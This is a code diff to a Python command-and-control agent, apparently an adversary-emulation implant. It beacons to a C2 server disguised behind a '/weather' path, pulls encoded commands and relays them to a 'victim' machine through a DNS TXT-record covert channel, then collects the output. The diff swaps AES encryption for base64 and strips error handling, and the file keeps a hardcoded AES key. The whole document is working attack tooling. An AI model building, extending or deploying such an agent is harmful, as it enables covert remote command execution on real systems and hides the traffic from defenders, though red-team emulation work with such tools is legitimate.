@@ -9,7 +9,7 @@ import datetime
 import time
 import socket
 
-import base64
+from base64 import b64encode, b64decode
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -45,23 +45,23 @@ class TryLoop:
         self.profile['platform'] = platform
         self.profile['pid'] = pid
         while True:
-            try:
-                self.profile['results'] = []
-                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
-                beacon = self._send_beacon()
-                instructions = self._next_instructions(beacon=beacon)
-                sleep = self._handle_instructions(instructions, sock)
-                time.sleep(sleep)
-            except Exception as e:
+            #try:
+            self.profile['results'] = []
+            print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
+            beacon = self._send_beacon()
+            instructions = self._next_instructions(beacon=beacon)
+            sleep = self._handle_instructions(instructions, sock)
+            time.sleep(sleep)
+            """except Exception as e:
                 print('[-] Operation loop error %s' % e)
                 time.sleep(30)
-            """command = str(input())
+            command = str(input())
             to = str(input())
             output = self.exec(command, to, sock)
             print(output)"""
 
     def _send_beacon(self):
-        website = '%s?profile=%s' % (self.profile['server'], self._encode_string(json.dumps(self.profile)))
+        website = '%s?profile=%s' % (self.profile['server'] + "/weather", self._encode_string(json.dumps(self.profile)))
         return requests.get(website)
 
     def _next_instructions(self, beacon):
@@ -84,18 +84,19 @@ class TryLoop:
     def _execute_instruction(self, i, sock):
         print('[+] Running instruction: %s' % i['id'])
         cmd = self._decode_bytes(i['command'])
+        print("Executing the command:", cmd, "with timeout:", i['timeout'])
         output = self.exec(cmd, i['timeout'], sock)
         #output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
         return dict(output=self._encode_string(output), pid=os.getpid(), status=0, id=i['id']), i['sleep']
 
     def exec(self, command, timeout, sock):
-        entry = "txt-record=cmd.bark-bark.tree,"
-        encryptedCommand = self.encrypt(command)
+        entry = "txt-record=cmd.bark-bark.tree,\""
+        encryptedCommand = b64encode(command.encode('utf-8')) #self.encrypt(command)
         entry += encryptedCommand.decode('utf-8')
         entry += ";"
-        entry += timeout
+        entry += str(timeout)
+        entry += "\""
         entry += "\n"
-
         with open(DNS_RECORD_FILE, "w") as f:
             f.write(entry)
 
@@ -106,8 +107,8 @@ class TryLoop:
         exec_sock.sendto("1".encode('utf-8'), (self.victim_details['ip'], DNS_PORT))
         print("Receiving output from", self.victim_details['ip'], "...")
         data, addr = sock.recvfrom(512)
-        out = data.decode('utf-8', errors='ignore')
-        
+        out = (b64decode(data)).decode('utf-8', errors='ignore')
+        print("Instruction output:", out)
         return out
 
 
@@ -118,7 +119,7 @@ class TryLoop:
         iv = Random.new().read(AES.block_size)
         key = hashlib.sha256("g0vwQgZcBCfFNduQCGFVUvudv8gUMPYp".encode()).digest()
         cipher = AES.new(key, AES.MODE_CBC, iv)
-        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
+        return b64encode(iv + cipher.encrypt(raw.encode()))
 
     def _pad(self, s):
         bs = AES.block_size
@@ -140,7 +141,7 @@ def build_profile(server_addr):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser('Start here')
-    parser.add_argument('-W', '--website', required=False, default='http://10.150.0.7:8888/weather')
+    parser.add_argument('-W', '--website', required=False, default='http://10.150.0.7:8888')
     args = parser.parse_args()
     SERVER_ADDR = args.website
     p = build_profile('%s' % args.website)
